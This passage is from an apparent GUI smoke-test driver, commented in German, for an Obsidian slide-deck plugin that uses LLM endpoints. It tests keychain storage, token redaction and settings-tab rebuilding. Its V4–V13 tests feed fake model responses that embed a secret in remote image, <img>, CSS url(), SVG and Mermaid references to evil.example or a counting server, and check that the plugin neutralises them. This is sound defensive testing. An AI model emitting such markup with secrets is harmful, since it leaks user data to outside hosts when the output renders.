    return { warnung, anfrage: ctxAnfrage ? { pfad: ctxAnfrage.url, key: ctxAnfrage.header["x-api-key"], version: ctxAnfrage.header["anthropic-version"] } : null };
  };
  try {
    await installFakeManager(cdp, {
      endpunkte: [{ id: "fake-claude", label: "Claude API", url: stub.url, models: [MODELL], defaultModel: MODELL, configModel: "default",
        provider: "anthropic", backend: "anthropic", apiKey: SCHLUESSEL, hasSecret: true, transport: "anthropic" }],
      invalidiere: [PLUGIN_ID],
    });
    manager = true;
    const gross = await lauf(200000);
    const klein = await lauf(4000);
    record(CX1_NAME,
      gross.anfrage !== null && gross.anfrage.key === SCHLUESSEL && typeof gross.anfrage.version === "string"
        && !/tokens vs|Tokens\)|vs\. /.test(gross.warnung) && /vs 4000|vs\. 4000/.test(klein.warnung),
      `200000: Kontext-Anfrage ${gross.anfrage === null ? "FEHLT" : gross.anfrage.pfad + " mit x-api-key " + (gross.anfrage.key === SCHLUESSEL ? "ok" : "FALSCH") + ", anthropic-version " + String(gross.anfrage.version)}, Warnung ${JSON.stringify(gross.warnung)}; 4000: Warnung ${JSON.stringify(klein.warnung)}`);
  } catch (e) {
    if (!bilanz.eintraege().some((x) => x.name === CX1_NAME)) bilanz.unmeasured(CX1_NAME, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (manager) await entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] }).catch(() => undefined);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llmEndpoints = ${vorherEndpoints}; p.settings.choice = ${vorherChoice}; p.llm.invalidate();
      app.workspace.detachLeavesOfType("slide-deck-hub");
      return true;
    `).catch(() => undefined);
    await stub.stop();
  }
}

/** TR1 — der Oeffnen-Haken (`installTabRefreshOnOpen`, Kit 0.70.0): Obsidian ruft beim Oeffnen `renderTab()`, nicht `display()`; baut das
 *  Plugin den Haken in `hide()` ab, zeichnet der Tab nur beim ERSTEN Oeffnen vollstaendig neu. Der Punkt zaehlt die Aufrufe von
 *  `renderImperative` (der Aufbau, den der Haken ausloest) ueber zwei Oeffnen: je Oeffnen mindestens einer. Ein sichtbarer Wert taugt hier
 *  nicht: die native `renderTab` liest die Werte der Steuerelemente frisch, auch ohne den Haken (gemessen: der Tab zeigte einen von aussen
 *  geaenderten Wert in beiden Faellen). Gegenprobe im Aufbau: ohne Oeffnen steht der Zaehler auf 0. */
async function pruefeTabAufbau(cdp: Cdp, ctx: Ctx): Promise<void> {
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const zaehler = (): Promise<number> => cdp.evaluate<number>(`return globalThis.__tr1 ?? -1;`);
  try {
    await cdp.evaluate(`
      const t = ${P}.settingTab;
      const orig = t.renderImperative;
      globalThis.__tr1 = 0;
      globalThis.__tr1Orig = orig;
      t.renderImperative = function (...a) { globalThis.__tr1++; return orig.apply(this, a); };
      return true;
    `);
    const null0 = await zaehler();
    const erst = await oeffneTab(cdp, ctx);
    await schliesseTab(cdp, erst);
    const nachErst = await zaehler();
    const zweit = await oeffneTab(cdp, ctx);
    await schliesseTab(cdp, zweit);
    const nachZweit = await zaehler();
    record(TR1_NAME, null0 === 0 && nachErst >= 1 && nachZweit > nachErst,
      `Aufbauten (renderImperative): vor dem Oeffnen ${null0}, nach dem ersten Oeffnen ${nachErst}, nach dem zweiten ${nachZweit}`);
  } catch (e) {
    if (!bilanz.eintraege().some((x) => x.name === TR1_NAME)) bilanz.unmeasured(TR1_NAME, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    await cdp.evaluate(`
      const t = ${P}.settingTab;
      if (globalThis.__tr1Orig) t.renderImperative = globalThis.__tr1Orig;
      delete globalThis.__tr1; delete globalThis.__tr1Orig;
      return true;
    `).catch(() => undefined);
  }
}

const verbindung: Section = {
  key: "verbindung",
  title: "V · Verbindung (Schluesselbund, Bearer, Schwaerzung)",
  async run(cdp, ctx) {
    const KEY = "sk-smoke-w15-0123456789abcdef";
    const TOKEN = "abcdef0123456789ghijkl";
    const fake = await startFakeChat();
    try {
      const r = JSON.parse(await cdp.evaluate<string>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.llmEndpoints = [{ url: ${JSON.stringify(fake.url)}, apiKey: ${JSON.stringify(KEY)}, model: "google/gemma-4-e4b" }];
        p.llm.invalidate();
        const src = await p.llm.resolve({ force: true });
        await new Promise((x) => setTimeout(x, 800));
        const datei = p.manifest.dir + "/data.json";
        const roh = (await app.vault.adapter.exists(datei)) ? await app.vault.adapter.read(datei) : "";
        const hydriert = src.config ? src.config.apiKey === ${JSON.stringify(KEY)} : false;
        const res = await p.llm.complete({ messages: [{ role: "user", content: "Zugang: Authorization: Bearer ${TOKEN} bitte nutzen." }] });
        return JSON.stringify({
          datei: roh !== "", keyInDatei: roh.includes(${JSON.stringify(KEY)}), apiKeyFeld: /"apiKey"/.test(roh), hydriert,
          ok: res.ok, content: res.ok ? res.content : null, redactions: res.redactions ?? null,
        });
      `)) as { datei: boolean; keyInDatei: boolean; apiKeyFeld: boolean; hydriert: boolean; ok: boolean; content: string | null; redactions: number | null };
      record("V1 Schluesselbund: nach dem Aufloesen steht kein apiKey mehr in data.json, der Aufrufer bekommt ihn hydriert",
        r.datei && !r.keyInDatei && !r.apiKeyFeld && r.hydriert, JSON.stringify(r));
      const wire = JSON.stringify(fake.bodies[0] ?? {});
      record("V2 Bearer: der Schluessel aus dem Schluesselbund geht als Authorization-Header hinaus",
        fake.auth[0] === `Bearer ${KEY}`, `Server sah ${fake.auth[0] === undefined ? "keinen Header" : fake.auth[0]!.replace(KEY, "<Schluessel>")}`);
      record("V3 Schwaerzung: das Token geht als Platzhalter an den Server, im Ergebnis steht das Original",
        r.ok && !wire.includes(TOKEN) && /\[redacted-/.test(wire) && (r.content ?? "").includes(TOKEN) && (r.redactions ?? 0) > 0,
        `Draht ohne Original: ${!wire.includes(TOKEN)} · Platzhalter da: ${/\[redacted-/.test(wire)} · Original im Ergebnis: ${(r.content ?? "").includes(TOKEN)} · redactions=${r.redactions}`);
      // V4–V8 — die Sicherheitsgrenze der Schwaerzung: die restaurierte Antwort darf beim Rendern nichts von
      // aussen laden (Original in einer Fern-URL = Geheimnis geht ohne Klick hinaus). Die Antwort kommt von einem
      // Fake-Server, das Deck wird ueber den echten Erzeugen-Weg in eine Notiz geschrieben, die Notiz gelesen und
      // gerendert. Gegenprobe je Weg: dieselbe Antwort OHNE Entschaerfung laedt von aussen (Node-seitig gerendert).
      const SECRET = "sk-abcdef0123456789abcdef";
      const laedt = (md: string): boolean => {
        const html = renderMarkdown({ markdown: md, resolveEmbed: () => null }).html;
        return /<(?:img|iframe|video|audio|source)\b[^>]*\bsrc=["']?https?:/i.test(html) || /url\(\s*["']?https?:/i.test(html);
      };
      const generiere = async (antwort: string, ziel: string): Promise<string> => {
        const f = await startFakeChat({ antwort });
        try {
          erzeugtePfade.push(ziel);
          await cdp.evaluate(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            p.settings.llmEndpoints = [{ url: ${JSON.stringify(f.url)}, model: "google/gemma-4-e4b" }];
            p.llm.invalidate();
            await p.llm.resolve();
            globalThis.__sdV = { fertig: false };
            const h = p.startDeckGeneration({ sourceBody: "# Probe\\n\\nEin Satz.", slideTarget: 3, hint: "", themeKey: p.settings.defaultTheme,
              model: "google/gemma-4-e4b", targetPath: ${JSON.stringify(ziel)}, replace: true, sourceLink: "[[smoke]]" });
            h.done.then((r) => { globalThis.__sdV = { fertig: true, status: r.status }; });
            return true;
          `);
          await pollUntil<string>(cdp, `const s = globalThis.__sdV; return s && s.fertig ? JSON.stringify(s) : null;`, 60_000, 300);
          return await cdp.evaluate<string>(`const f = app.vault.getAbstractFileByPath(${JSON.stringify(ziel)}); return f ? await app.vault.read(f) : "";`);
        } finally { await f.close(); }
      };
      const wege: { id: string; name: string; antwort: string }[] = [
        { id: "V4", name: "Markdown-Bild", antwort: `---\ntheme: kami\n---\n# A\n\n![x](https://evil.example/?d=${SECRET})\n\n---\n\n# B` },
        { id: "V5", name: "rohes <img>", antwort: `---\ntheme: kami\n---\n# A\n\n<img src="https://evil.example/h?d=${SECRET}">\n\n---\n\n# B` },
        { id: "V6", name: "url() in style", antwort: `---\ntheme: kami\n---\n# A\n\n<div style="background:url(https://evil.example/b?d=${SECRET})">x</div>\n\n---\n\n# B` },
      ];
      for (const w of wege) {
        const note = await generiere(w.antwort, `smoke-sicher-${w.id.toLowerCase()}.md`);
        record(`${w.id} Entschaerfung: ${w.name} in der erzeugten Notiz laedt nichts von aussen (Gegenprobe: ohne sie laedt es)`,
          note !== "" && laedt(w.antwort) && !laedt(note), `Notiz geschrieben: ${note !== ""} · ohne Entschaerfung laedt: ${laedt(w.antwort)} · mit: ${note !== "" ? laedt(note) : "n/a"}`);
      }
      const fence = "---\ntheme: kami\n---\n# A\n\n```dataviewjs\ndv.pages()\n```\n\n---\n\n# B";
      const fenceNote = await generiere(fence, "smoke-sicher-v7.md");
      record("V7 Entschaerfung: ein dataviewjs-Block steht in der erzeugten Notiz nicht mehr als Prozessor-Fence (Gegenprobe: die Antwort hatte ihn)",
        fenceNote !== "" && /^```dataviewjs/m.test(fence) && !/^```dataviewjs/m.test(fenceNote), `Notiz geschrieben: ${fenceNote !== ""} · Fence in der Notiz: ${/^```dataviewjs/m.test(fenceNote)}`);
      const gut = "---\ntheme: kami\n---\n# A\n\n<!-- layout: two-column -->\n\n![[bild.png]]\n\n```mermaid\ngraph TD; A-->B\n```\n\n![lokal](data:image/png;base64,AAAA)\n\n---\n\n# B\n\n[Link](https://example.org)";
      const gutNote = await generiere(gut, "smoke-sicher-v8.md");
      const bleibt = ["<!-- layout: two-column -->", "![[bild.png]]", "```mermaid", "![lokal](data:image/png;base64,AAAA)", "[Link](https://example.org)"];
      record("V8 Entschaerfung laesst ein normales Deck unveraendert: Direktive, Datei-Embed, Mermaid, data:-Bild und Link bleiben",
        gutNote !== "" && bleibt.every((b) => gutNote.includes(b)), `fehlend: ${JSON.stringify(bleibt.filter((b) => !gutNote.includes(b)))}`);

      // V9–V11 — zweite Schicht (Welle 16): eine Fernquelle, die die Regex-Schicht stehen laesst (SVG-Attribut `filter=url(…)`,
      // Fixture "r2 B13" aus code-kit), darf auch nach dem Rendern in echtem Chromium keinen Treffer am Draht erzeugen.
      const zaehler = await startZaehler();
      try {
        const ladeImFenster = async (md: string): Promise<void> => {
          const html = renderMarkdown({ markdown: md, resolveEmbed: () => null }).html;
          await cdp.evaluate(`
            const f = document.createElement("iframe");
            f.srcdoc = ${JSON.stringify(html)};
            document.body.appendChild(f);
            await new Promise((x) => setTimeout(x, 2000));
            f.remove();
            return true;
          `);
        };
        const treffer = (marke: string): number => zaehler.pfade().filter((x) => x.includes(marke)).length;
        const svgAntwort = `---\ntheme: kami\n---\n# A\n\n<svg><rect width="10" height="10" fill="url(${zaehler.url}/v9.svg#f) red"/></svg>\n\n---\n\n# B`;
        const svgNote = await generiere(svgAntwort, "smoke-sicher-v9.md");
        await ladeImFenster(svgAntwort);
        const ohne = treffer("/v9.svg");
        await ladeImFenster(svgNote);
        const mit = treffer("/v9.svg") - ohne;
        record("V9 Zweite Schicht: eine Fernquelle, die die Regex-Schicht uebersieht (SVG fill=url), erzeugt keine Anfrage am Draht (Gegenprobe: die rohe Antwort schon)",
          svgNote !== "" && ohne > 0 && mit === 0 && !svgNote.includes("<svg"), `Notiz geschrieben: ${svgNote !== ""} · Treffer ohne zweite Schicht: ${ohne} · mit: ${mit} · <svg> in der Notiz: ${svgNote.includes("<svg")}`);
        record("V10 Zweite Schicht: nur die betroffene Folie wird Text, die Nachbarfolie bleibt",
          svgNote.includes("# A") && svgNote.includes("# B") && /&lt;svg>/.test(svgNote), `Folie A: ${svgNote.includes("# A")} · Folie B: ${svgNote.includes("# B")} · Text statt Tag: ${/&lt;svg>/.test(svgNote)}`);
        // V12/V13 — die Vorschau rendert JEDE REGION fuer sich (render-dom.ts): ein offenes <textarea> in Region 1 darf Region 2 nicht
        // verschlucken, und Mermaid laedt ausserhalb jedes Baums (`A@{ img: "https://…" }`). Gemessen an der echten Vorschau:
        // das erzeugte Deck erzeugt keinen Treffer, dieselbe Antwort als eigenes Deck (Gegenprobe) schon.
        const vorschauTreffer = async (pfad: string, inhalt: string | null, marke: string): Promise<number> => {
          if (inhalt !== null) {
            erzeugtePfade.push(pfad);
            await cdp.evaluate(`
              const f = app.vault.getAbstractFileByPath(${JSON.stringify(pfad)});
              if (f) await app.vault.modify(f, ${JSON.stringify(inhalt)}); else await app.vault.create(${JSON.stringify(pfad)}, ${JSON.stringify(inhalt)});
              return true;
            `);
          }
          const vorher = treffer(marke);
          await openPreview(cdp, pfad);
          await new Promise((x) => setTimeout(x, 3500));
          return treffer(marke) - vorher;
        };
        const taAntwort = `---\ntheme: kami\n---\n# A\n\n<textarea>\n\n<!-- column -->\n\n<svg><rect width="10" height="10" fill="url(${zaehler.url}/v12.svg#f) red"/></svg>\n\n---\n\n# B`;
        const taNote = await generiere(taAntwort, "smoke-sicher-v12.md");
        const taMit = await vorschauTreffer("smoke-sicher-v12.md", null, "/v12.svg");
        const taOhne = await vorschauTreffer("smoke-roh-v12.md", taAntwort, "/v12.svg");
        record("V12 Zweite Schicht je Region: ein offenes <textarea> in Region 1 versteckt die Fernquelle in Region 2 nicht (Gegenprobe: das rohe Deck laedt in der Vorschau)",
          taNote !== "" && taOhne > 0 && taMit === 0, `Notiz geschrieben: ${taNote !== ""} · Treffer roh: ${taOhne} · erzeugt: ${taMit}`);
        const mmAntwort = `---\ntheme: kami\n---\n# A\n\n\`\`\`mermaid\ngraph TD\n  A@{ img: "${zaehler.url}/v13.png", label: "a" }\n\`\`\`\n\n---\n\n# B`;
        const mmNote = await generiere(mmAntwort, "smoke-sicher-v13.md");
        const mmMit = await vorschauTreffer("smoke-sicher-v13.md", null, "/v13.png");
        const mmOhne = await vorschauTreffer("smoke-roh-v13.md", mmAntwort, "/v13.png");
        record("V13 Zweite Schicht: Mermaid-Bildform `A@{ img: \"https://…\" }` erzeugt in der Vorschau keine Anfrage (Gegenprobe: das rohe Deck laedt)",
          mmNote !== "" && mmOhne > 0 && mmMit === 0 && !/```mermaid/.test(mmNote), `Notiz geschrieben: ${mmNote !== ""} · Treffer roh: ${mmOhne} · erzeugt: ${mmMit} · Fence in der Notiz: ${/```mermaid/.test(mmNote)}`);
        // V11 — Variante A: ein selbst geschriebenes Deck mit Fernbild laedt in der Vorschau weiter (die Schicht greift nur beim Erzeugen).
        const eigen = "smoke-eigenes-deck-v11.md";
        erzeugtePfade.push(eigen);
        await cdp.evaluate(`
          const p = ${JSON.stringify(eigen)};
          const inhalt = ${JSON.stringify(`---\ntheme: kami\n---\n# Eigenes Deck\n\n![](${zaehler.url}/v11-logo.png)\n`)};
          const f = app.vault.getAbstractFileByPath(p);
          if (f) await app.vault.modify(f, inhalt); else await app.vault.create(p, inhalt);
          return true;
        `);
        await openPreview(cdp, eigen);
        await new Promise((x) => setTimeout(x, 2000));
        record("V11 Eigenes Deck mit Fernbild laedt in der Vorschau weiter (Variante A: die zweite Schicht greift nur beim Erzeugen)",
          treffer("/v11-logo.png") > 0, `Treffer am Draht: ${treffer("/v11-logo.png")}`);
      } finally { await zaehler.close(); }
      await pruefeClaudeVerbindung(cdp);
      await pruefeDenkTestClaude(cdp, ctx);
      await pruefeModellzeile(cdp, ctx);
      await pruefeKontextClaude(cdp);
      await pruefeTabAufbau(cdp, ctx);
    } finally {
      await fake.close();
      // Den Klartext-Schluessel nicht im Staging-Vault liegen lassen: Liste leeren, Schluesselbund-Eintraege des Plugins loeschen.
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        for (const e of p.settings.llmEndpoints) { if (e.secretId) app.secretStorage.setSecret(e.secretId, ""); }
        p.llm.invalidate();
        return true;
      `).catch(() => undefined);
    }
  },
};

/** M steht VOR dem Export, nicht dahinter: der Export-Abschnitt setzt eine Probe-Regel ins
 *  `customCss` und raeumt sie erst im `finally` des Laufs weg. Liefe M danach, faerbte diese
 *  Regel in die Messung hinein. N steht aus demselben Grund davor. */
const SECTIONS: Section[] = [vorschau, mermaid, bildplaetze, einstellungen, anfrage, verbindung, endpunktQuelle, explorer, exportSektion, chatSektion];

// --- Lauf --------------------------------------------------------------------

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const port = Number(args.value("port") ?? "");
  if (!Number.isInteger(port) || port <= 0) {
    throw new Error("--port <port> ist Pflicht (Zweitinstanz, siehe Kopf dieser Datei); kein Standardport.");
  }
  const vault = args.value("vault") ?? PLUGIN_ID;
  const keep = args.has("keep");
  const sectionArg = args.value("section");

  // `--section a,b` fährt mehrere Abschnitte in der Reihenfolge von SECTIONS (Bisektion von Zustandslecks, CORE-TEST-21).
  const wanted = sectionArg ? sectionArg.split(",").map((k) => k.trim()) : null;
  const sections = wanted ? SECTIONS.filter((s) => wanted.includes(s.key)) : SECTIONS;
  if (sections.length === 0 || (wanted && sections.length !== new Set(wanted).size)) {
    throw new Error(`Unbekannter --section ${sectionArg}. Bekannt: ${SECTIONS.map((s) => s.key).join(", ")}`);
  }

  bilanz = createBilanz({ punkte: [C0, ...sections.flatMap((x) => ABSCHNITT_PUNKTE[x.key] ?? [])] });

  console.log(`GUI-Smoke — Obsidian auf Port ${port}`);
  const cdp = await attachTo("workspace", port, vault);
  if (!cdp) {
    throw new Error(
      `Kein Obsidian-Fenster auf Port ${port} fuer Vault "${vault}".\n` +
      "Zweitinstanz starten (Rezept im Kopf dieser Datei), nicht die regulaere Instanz neu starten.",
    );
  }

  // Ausserhalb des try: das finally muss auch nach einem Abbruch mitten im Lauf
  // zurueckschreiben koennen.
  let vorherigeEinstellungen: string | null = null;

  // Ein SIGINT mitten im Lauf ueberspringt das `finally` unten NICHT im try/catch-Sinn,
  // sondern beendet den Node-Prozess sofort — drei Zustandssorten ueberleben das sonst:
  //  · `vorherigeEinstellungen` (der volle Settings-Snapshot; deckt auch die inneren
  //    Test-Mutationen ab, die ihre eigenen `finally`s haben, z. B. B4s llmEndpoints-Stub —
  //    die stehen alle unter demselben `plugin.settings`-Objekt).
  //  · `erzeugtePfade` (modulweiter Array, angelegte Test-Ordner/-Notizen fuer den Papierkorb).
  //  · der `local-image-generator`-Plugin-Slot (N2/N2b) — als `globalThis.__sdVorherLIG` bzw.
  //    `globalThis.__sdEchterVorbestand` im RENDERER gesichert, nicht als Node-Closure: nur so
  //    erreicht sie ein Handler, der unabhaengig davon feuert, WELCHER Abschnitt gerade laeuft.
  //    Ohne Rueckbau bliebe ein Stub stehen, der die Live-Registrierung eines echt
  //    installierten LIG ueberschreibt (dieselbe Gefahrenklasse wie vault-rag/llm-lab).
  // Abbruch-Modul der Bruecke (README § Abbruch): bei Ctrl-C laeuft dieser Schritt, dann druckt das Modul die Bilanz und endet mit
  // Exit 130. Derselbe Schritt laeuft im Normalweg ueber `zustand.schliesse()`; er ist idempotent und wartet im Abbruch nicht.
  const zustandZurueck = async (): Promise<void> => {
    await cdp
      .evaluate(`
        const plugin = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        if (plugin) {
          ${vorherigeEinstellungen !== null ? `
          Object.assign(plugin.settings, JSON.parse(${JSON.stringify(vorherigeEinstellungen)}));
          await plugin.saveSettings?.();
          plugin.llm?.invalidate();
          if (typeof plugin.applyFolderHide === "function") plugin.applyFolderHide();
          ` : ""}
        }
        if (globalThis.__sdVorherLIG !== undefined || "__sdVorherLIG" in globalThis) {
          if (globalThis.__sdVorherLIG === undefined) delete app.plugins.plugins["local-image-generator"];
          else app.plugins.plugins["local-image-generator"] = globalThis.__sdVorherLIG;
          delete globalThis.__sdVorherLIG;
        }
        if (globalThis.__sdEchterVorbestand !== undefined || "__sdEchterVorbestand" in globalThis) {
          if (globalThis.__sdEchterVorbestand === undefined) delete app.plugins.plugins["local-image-generator"];
          else app.plugins.plugins["local-image-generator"] = globalThis.__sdEchterVorbestand;
          delete globalThis.__sdEchterVorbestand;
        }
        if ("__sdVorherMgr" in globalThis) {
          if (globalThis.__sdVorherMgr === undefined) delete app.plugins.plugins["llm-endpoint-manager"];
          else app.plugins.plugins["llm-endpoint-manager"] = globalThis.__sdVorherMgr;
          delete globalThis.__sdVorherMgr;
        }
        return true;
      `)
      .catch(() => { console.log("  ! Aufraeumen im Renderer fehlgeschlagen — Vault von Hand pruefen"); });
    if (!keep && erzeugtePfade.length) {
      await cdp
        .evaluate(`
          for (const pfad of ${JSON.stringify(erzeugtePfade)}) {
            // Papierkorb, nicht Hard-Delete: was ein Werkzeug im Vault des Maintainers
            // anfasst, muss zurueckholbar bleiben. Kennt der Index den frisch geschriebenen
            // Ordner noch nicht, erst indizieren lassen (im Normalweg) — und nur wenn das nichts bringt,
            // ueber den Adapter raeumen (dann ohne Papierkorb, deshalb die Meldung).
            let f = app.vault.getAbstractFileByPath(pfad);
            if (!f && ${istAbgebrochen() ? "false" : "true"}) { await new Promise((r) => setTimeout(r, 1500)); f = app.vault.getAbstractFileByPath(pfad); }
            if (f) await app.fileManager.trashFile(f);
            else if (await app.vault.adapter.exists(pfad)) {
              await app.vault.adapter.rmdir(pfad, true);
              console.log("gui-smoke: " + pfad + " ueber den Adapter entfernt (nicht im Papierkorb)");
            }
          }
          return true;
        `)
        .catch(() => undefined);
    }
  };
  const zustand = beimAbbruch(zustandZurueck, "Vault-Zustand zurücksetzen");

  try {
    // Ohne Sichtbarkeit drosselt Chromium den Renderer, das Deck rendert nicht und JEDER Punkt
    // waere rot. `requireVisible` zielt auf das VERBUNDENE Fenster; ein `osascript … activate`
    // holte stattdessen die reguelaere Instanz nach vorn (Befund kl-w19).
    await requireVisible(cdp);

    // Vertrauensdialog, Restricted Mode und Aktivierung: zentrale Fassung. `pluginIds` sind
    // `manifest.id`s, `nurVault` der Name des Staging-Vaults.
    const vorbereitung = await bereiteInstanzVor(cdp, { pluginIds: [PLUGIN_ID], nurVault: vault, sprache: "en" });
    console.log(`Instanz: ${vorbereitung.hinweis}`);

    const vaultName = await cdp.evaluate<string>(`return app.vault.getName();`);
    console.log(`Vault: ${vaultName}`);

    // Neu laden, bevor irgendetwas gemessen wird: `npm run deploy` ersetzt nur Dateien, die laufende Instanz behaelt den alten Code im
    // Speicher. `ladePluginNeu` prueft vorher die Herkunft (`repoMainJs` → `requireEigenerBuild`: Store-Build oder fremder Stand
    // wird abgelehnt — `manifest.version` ist dafuer strukturell blind, Lesson 2026-09-02 kuro-gamification) und stellt danach die
    // Version auf der Platte neben die im Speicher; der Pfad kommt aus der LAUFENDEN Instanz, nicht aus stagingVaultDir().
    const neu = await ladePluginNeu(cdp, PLUGIN_ID, { repoMainJs: join(process.cwd(), "main.js"), melde: console.error });
    if (!neu.geladen) throw new Error(`Plugin ${PLUGIN_ID} liess sich nicht aktivieren — ${neu.hinweis}`);
    if (!neu.aktuell) throw new Error(neu.hinweis);
    console.log(`Plugin: ${neu.hinweis}\n`);

    // 0 — ein liegen gebliebener local-image-generator-Stub aus einem per Ctrl-C
    // abgebrochenen Vorlauf (vor diesem Handler bzw. bei einem SIGKILL) waere sonst still UND
    // gefaehrlich: die Live-Registrierung eines echt installierten LIG bliebe ueberschrieben,
    // bis Obsidian neu startet. Der Marker `__sdSmokeStub` macht ihn erkennbar.
    const staleStub = await cdp.evaluate<boolean>(`
      const p = app.plugins.plugins["local-image-generator"];
      if (p && p.__sdSmokeStub) { delete app.plugins.plugins["local-image-generator"]; return true; }
      return false;
    `);
    record(
      C0,
      !staleStub,
      staleStub ? "Stub aus einem Vorlauf gefunden und entfernt" : "kein Rest gefunden",
    );

    vorherigeEinstellungen = await cdp.evaluate<string>(`
      return JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings);
    `);

    for (const section of sections) {
      console.log(`── ${section.title}`);
      try {
        await section.run(cdp, { port, vault });
      } catch (fehler) {
        // Ein Abbruch (Ctrl-C) ist kein Abschnittsfehler: weiterwerfen, das Abbruch-Modul druckt die Bilanz.
        if (fehler instanceof AbbruchAusnahme) throw fehler;
        // Ein Abschnittsfehler ist kein Befund am Prueflings, sondern eine Messung, die nicht
        // stattgefunden hat: die noch offenen Punkte des Abschnitts zaehlen als „nichts gemessen".
        const grund = fehler instanceof Error ? fehler.message.split("\n")[0] : String(fehler);
        const da = new Set(bilanz.eintraege().map((x) => x.name));
        for (const n of ABSCHNITT_PUNKTE[section.key] ?? []) if (!da.has(n)) bilanz.unmeasured(n, `Abschnitt „${section.key}" abgebrochen: ${grund}`);
      }
      console.log("");
    }
  } finally {
    // Aufraeumen haengt nie am Ergebnis: auch ein abgebrochener Lauf gibt den Vault so zurueck, wie er ihn vorgefunden hat.
    // `schliesse` raeumt im Normalweg auf und meldet den Schritt ab; nach Ctrl-C hat das Abbruch-Modul ihn schon gefahren und
    // beendet den Prozess selbst.
    await zustand.schliesse();
    if (istAbgebrochen()) return;
    await closeExtraLeaves(cdp).catch(() => 0);
    await releaseAlwaysOnTop(cdp).catch(() => undefined);
    cdp.close();
  }

  // Die Soll-Liste ist der Nenner; `abschluss()` setzt Exit 1 bei Rot oder „nichts gemessen".
  bilanz.abschluss();
}

runDriver(main);
